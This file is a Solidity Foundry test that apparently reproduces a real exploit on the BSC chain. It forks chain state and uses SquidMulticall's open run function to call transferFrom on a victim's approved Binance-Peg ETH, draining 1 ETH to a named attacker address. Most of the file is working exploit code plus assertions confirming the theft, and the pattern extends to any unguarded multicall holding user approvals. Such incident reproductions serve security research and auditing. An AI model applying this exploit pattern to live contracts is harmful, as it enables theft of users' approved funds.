// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 1 ETH
// Attacker : 0xe02b595ca69d8d3e120043536e6e76caea385a82
// Attack Contract : 0x101c6e9f62554ddd3a32f395c655e20512ab321d
// Vulnerable Contract : 0xad6cea45f98444a922a2b4fe96b8c90f0862d2f4
// Attack Tx : https://bscscan.com/tx/0x81d0c429ee7eae19d8c4d9d797dbd3828279060096e703b11cca739c9b1301e9

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xad6cea45f98444a922a2b4fe96b8c90f0862d2f4#code

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2041530294369386806
//
// The attacker used SquidMulticall.run with one Default call whose target was the Binance-Peg ETH token.
// Because the victim had approved SquidMulticall, the multicall contract could execute transferFrom and
// move 1 ETH from the victim to the attacker.
// The Twitter report notes about $800K of cross-chain approvals were at risk and about $512K was later
// rescued by Defimon. This PoC is scoped to the exploit transaction, which transferred 1 ETH.

address constant ATTACKER = address(bytes20(hex"e02b595ca69d8d3e120043536e6e76caea385a82"));
address constant SQUID_MULTICALL = address(bytes20(hex"ad6cea45f98444a922a2b4fe96b8c90f0862d2f4"));
address constant VICTIM = address(bytes20(hex"acc0c1f672b03b9a5fed4535f840f09b85f40e98"));
IERC20 constant ETH_TOKEN = IERC20(address(bytes20(hex"2170ed0880ac9a755fd29b2688956bd959f933f8")));

interface ISquidMulticall {
    enum CallType {
        Default,
        FullTokenBalance,
        FullNativeBalance,
        CollectTokenBalance
    }

    struct Call {
        CallType callType;
        address target;
        uint256 value;
        bytes callData;
        bytes payload;
    }

    function run(
        Call[] calldata calls
    ) external payable;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 91_122_249;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = address(ETH_TOKEN);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(SQUID_MULTICALL, "SquidMulticall");
        vm.label(VICTIM, "Victim");
        vm.label(address(ETH_TOKEN), "ETH Token");
    }

    function testExploit() public balanceLog {
        uint256 attackerBefore = ETH_TOKEN.balanceOf(ATTACKER);
        uint256 victimBefore = ETH_TOKEN.balanceOf(VICTIM);
        uint256 allowanceBefore = ETH_TOKEN.allowance(VICTIM, SQUID_MULTICALL);
        uint256 drainAmount = 1 ether;

        assertEq(allowanceBefore, type(uint256).max, "victim did not approve SquidMulticall");
        assertGe(victimBefore, drainAmount, "victim did not hold enough ETH");

        // step 1: build the same SquidMulticall Call shape used by the exploit transaction.
        ISquidMulticall.Call[] memory calls = new ISquidMulticall.Call[](1);
        calls[0] = ISquidMulticall.Call({
            callType: ISquidMulticall.CallType.Default,
            target: address(ETH_TOKEN),
            value: 0,
            callData: abi.encodeCall(IERC20.transferFrom, (VICTIM, ATTACKER, drainAmount)),
            payload: bytes("")
        });

        // step 2: any caller can make SquidMulticall execute the token transferFrom.
        vm.prank(ATTACKER, ATTACKER);
        ISquidMulticall(SQUID_MULTICALL).run(calls);

        // step 3: prove the victim allowance was spent and the attacker received the trace amount.
        uint256 attackerGain = ETH_TOKEN.balanceOf(ATTACKER) - attackerBefore;
        uint256 victimLoss = victimBefore - ETH_TOKEN.balanceOf(VICTIM);
        uint256 allowanceSpent = allowanceBefore - ETH_TOKEN.allowance(VICTIM, SQUID_MULTICALL);

        assertEq(attackerGain, drainAmount, "attacker did not receive ETH");
        assertEq(victimLoss, drainAmount, "victim did not lose ETH");
        assertEq(allowanceSpent, drainAmount, "allowance was not spent by ETH transferFrom");
        emit log_named_decimal_uint("ETH drained through SquidMulticall", attackerGain, 18);
    }
}
